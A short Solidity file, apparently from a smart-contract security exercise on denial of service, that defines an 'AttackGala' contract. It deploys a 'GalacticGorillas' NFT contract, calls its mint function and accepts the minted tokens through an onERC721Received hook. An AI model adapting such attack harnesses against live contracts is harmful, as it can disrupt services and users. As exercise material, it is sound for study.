// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

import {GalacticGorillas} from "../dos-4/GalacticGorillas.sol";

contract AttackGala {
    GalacticGorillas immutable galacticgorillas;

    constructor() {
        galacticgorillas = new GalacticGorillas();
    }

    function attack(uint8 amount) external {
        galacticgorillas.mint(amount);
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        return AttackGala.onERC721Received.selector;
    }
}
